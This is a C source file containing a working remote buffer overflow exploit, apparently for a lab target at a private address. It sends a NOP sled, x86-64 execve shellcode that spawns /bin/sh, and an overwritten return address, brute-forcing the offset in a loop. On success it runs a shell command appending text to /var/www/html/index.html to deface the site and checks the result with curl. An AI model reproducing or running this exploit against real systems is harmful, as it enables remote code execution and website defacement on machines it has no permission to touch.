#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/wait.h>

#define BUFFER_SIZE 256
#define SHELL_CODE_SIZE 23
#define ADDRESS 0x7fffffffe5f0
#define DESTINATION_IP "192.168.56.103"

void buildShellCode(uint8_t *buffer, int distance);

int main(int argc, char* argv[]) {
	uint8_t nonPointerBuffer[BUFFER_SIZE];
	uint8_t *buffer = nonPointerBuffer;

	struct sockaddr_in destination;
	memset(&destination,0,sizeof(destination));
	destination.sin_family = AF_INET;
	destination.sin_port = htons(4321);
	inet_pton(AF_INET, DESTINATION_IP, &(destination.sin_addr));

	char terminalCommand[200];
	char receivedBuffer[1000];

	int clientSocket;


    for (int distance = 0; distance < 50; distance++) {
        printf("\n\nTrying distance %d...\n", distance);		

		memset(nonPointerBuffer, 0, BUFFER_SIZE);
		buildShellCode(buffer, distance);


		clientSocket = socket(AF_INET, SOCK_STREAM, 0);
		if (clientSocket == -1) {
			perror("ERROR : SOCKET\n");
			return 0;
		}

		if (connect(clientSocket, (struct sockaddr*) &destination, sizeof(struct sockaddr_in))== -1) {
			perror("ERROR : CONNECT");
			return 0;
		}

		memset(receivedBuffer, 0, 1000);
		int receivedLength = recv(clientSocket, receivedBuffer, 1000, 0); 
		if (receivedLength == -1) {
			perror("ERROR : RECV");
			return 0;
		}

		printf("Received: %s\n", receivedBuffer);

		if (send(clientSocket, nonPointerBuffer, BUFFER_SIZE, 0) != BUFFER_SIZE) {
			perror("ERROR : SEND");
			return 0;
		}
		
		memset(terminalCommand, 0, 200);
		//echo 'Tomaz was here' >> /var/www/html/index.html
		strcpy(terminalCommand, "echo 'Tomaz was here' >> /var/www/html/index.html\n");
		send(clientSocket, terminalCommand, 256, 0);
		printf("Sent: %s", terminalCommand);
		memset(terminalCommand, 0, 200);

		memset(receivedBuffer, 0, 1000);
		read(clientSocket, receivedBuffer, 1000);

		int result = system("curl -s 192.168.56.103 | grep Tomaz");
		printf("Result of curl command: %d\n", result);
		if (WEXITSTATUS(result) == 0) {
			printf("Match found! Shellcode executed successfully.\n");
			return 0;
		} else {
			printf("No match or error occurred.\n");
		}
    }

	
	return 0;
};

void buildShellCode(uint8_t *buffer, int distance) {
	memset(buffer, 0x90, BUFFER_SIZE);  // NO OP

	uint8_t shellCode[SHELL_CODE_SIZE] = { 0x48,0x31,0xf6,0x56,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x57,0x54,0x5f,0x6a,0x3b,0x58,0x99,0x0f,0x05};
    //0x31 0xc0 0x48 0xbb 0xd1 0x9d 0x96 0x91 0xd0 0x8c 0x97 0xff 0x48 0xf7 0xdb 0x53 0x54 0x5f 0x99 0x52 0x57 0x54 0x5e 0xb0 0x3b 0x0f 0x05
    //\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
	long returnAddress = ADDRESS;

	memcpy(buffer, shellCode, SHELL_CODE_SIZE);
	memcpy(buffer + 128 + distance, &returnAddress, 6);
	*(buffer + 128 + distance + 6) = 0x00;

    for (size_t i = 0; i < (128+distance+6); i++) {
        //printf("\\x%02x", buffer[i]);
    }
    //printf("\n");
}
